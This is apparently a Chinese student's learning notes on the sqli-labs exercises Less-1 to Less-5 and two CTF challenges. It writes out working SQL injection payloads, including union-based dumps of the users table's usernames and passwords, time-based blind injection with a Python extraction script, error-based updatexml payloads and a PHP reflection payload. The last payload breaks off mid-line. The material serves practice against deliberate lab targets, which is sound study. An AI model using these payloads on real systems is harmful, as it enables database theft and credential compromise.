---
title: sqlilab学习
---

# less-1

![image-20210508101157423](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508101157423.png)

单引号闭合，猜测语句为select ... from ... where id=’1’

利用order by语句对表中字段进行查询，到4时发现报错

那么字段是3

union select联合查询找显注点

这里要用一个不存在的id，当我们在进行联合查询时将第一个select语句的where条件设置为不存在的条件这样他就能直接显示第二个语句也就是我们拼接的语句的结果，这样它返回的数值就是我们的显注点了

![image-20210508101558053](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508101558053.png)

查库名

```
?id=-1' union select 1,2,database() --+
```

![image-20210508101651360](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508101651360.png)

表名

```
?id=-1' union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+
```

![image-20210508101749059](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508101749059.png)

字段名，查users

```
?id=-1' union select 1,2,group_concat(column_name) from information_schema.columns where table_name='users' --+
```

![image-20210508101900134](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508101900134.png)

最后查出账号密码

```
?id=-1' union select 1,2,group_concat(username,password) from users--+
```

![image-20210508102052719](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508102052719.png)

其实可以用sqlmab直接跑

# less-2

数字型注入，其实就是把第一题的引号去掉就行

在输入单引号后发现我们输入什么，就会原封不动的带进去

# less-3

![image-20210508102824289](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508102824289.png)

观察报错语句

猜测语句为select ... from ... where id=(‘1’)

那就好办了

就是比第一题多加上个）就行了

![image-20210508102940490](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508102940490.png)

后面步骤和第一题一样。

# less-4

在输入单引号时发现没有报错

（sql做的少，第一次遇见）

查了别人得到writeup发现是双引号注入

![image-20210508103230334](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508103230334.png)

根据报错可以猜测语句是select ... from ... where id=(”1”)

那么可以用“）闭合然后加入注入语句

![image-20210508103357003](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508103357003.png)

后面就和前面一样了

# less-5

写下?id=1只有一个you are in.....

![image-20210508103523700](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508103523700.png)

猜测可能是盲注

![image-20210508103657520](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508103657520.png)

写入延时命令，发现确实执行了

说是盲注其实更像一个看报错的回显的注入

这里好像可以使用布尔型和延时型注入

```
?id=1' and if(left(database(),1)='s',sleep(5),1)--+
```

不太会写脚本

只能一个个手注

```
?id=1' and if(length(database())=8,sleep(5),1)--+
```

测出长度为8

```
?id=1' and if(left(database(),1)='s',sleep(5),1)--+
```

再测出数据库名

    import requests
    import time
    database=''
    str=''
    table='abcdefghigklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789@_.'
    for i in range(1,9):
    for char in table:
        charAscii = ord(char)
         
        url = "http://localhost/sql/Less-5/?id=1' and if(ascii(substr(database(),{0},1))>{1},1,sleep(3))--+"
        urlformat = url.format(i,charAscii)
          start_time = time.time()
         
        rsp = requests.get(urlformat)
         
        if  time.time() - start_time > 2.5:
            database+=char
            print ('database: ',database)
            break
        else:
            pass
    print ('database is ' + database)

写的脚本有点渣（能用就好）

测得数据库名为

![image-20210508122255956](C:\Users\luorui\AppData\Roaming\Typora\typora-user-images\image-20210508122255956.png)         

后面的就差不多了

改改脚本就可以了

就不多写了。

**easy_source**

用 dirsearch 扫了一下

没什么收获

![微信图片_20210516204855](C:\Users\luorui\Desktop\111\微信图片_20210516204855.png)

尝试查看备份文件，在.index.php.swo 看到源码

![微信图片_202105162048551](C:\Users\luorui\Desktop\111\微信图片_202105162048551.png)

通过审计代码，构造

Payload：?rc=ReflectionMethod&ra=User&rb=a&rd=getDocComment

// 通过 ReflectionMethod(‘User’，‘a’)去查看 a 下的注释

通过 ReflectionMethod(‘User’，‘a’)去查看 a 下的注释

然后进行爆破得到 flag

![微信图片_202105162048552](C:\Users\luorui\Desktop\111\微信图片_202105162048552.png)



easy_sql 

测试发现有报错回显，且是在passwd处 后又发现可以进行堆叠注入 

![微信图片_20210516205319](C:\Users\luorui\Desktop\111\微信图片_20210516205319.png)

基于俩者有大概思路构造payload 

先查询表 

 uname=admin&passwd=123') or updatexml(1,concat(0x7e,(select * from(select * from flag a join (select * from flag)b using(id,no))c),0x7e),1);#&Submit=登录 

![微信图片_202105162053191](C:\Users\luorui\Desktop\111\微信图片_202105162053191.png)

再根据表名进行注入

发现flag

uname=admin&passwd=123') or (updatexml(1,concat(0x7e,mid((select group_concat(`bbb3e6fa-9ea8-46b1-9f94-39e9279fe323`) from flag),1),0x7e),1));#&Submit=登录 

![微信图片_202105162053192](C:\Users\luorui\Desktop\111\微信图片_202105162053192.png) 

flag不完整，继续查看 

![微信图片_202105162053194](C:\Users\luorui\Desktop\111\微信图片_202105162053194.png)

得到完整flag uname=admin&passwd=123') or (updatexml(1,concat(0x7e,mid((select group_concat(`bbb3e6fa-9ea8-46b1-9f94-39e9279fe323`) fro

#  总结

接下来几周就做sqllab了，每周几题吧，顺便练一下写脚本，写脚本能力是真的菜，五题做下来还是有所收获的

明白了sql的一些基本的东西，第一次自己去写sql脚本,去了解request那些库的一些东西，自己感觉还可以吧。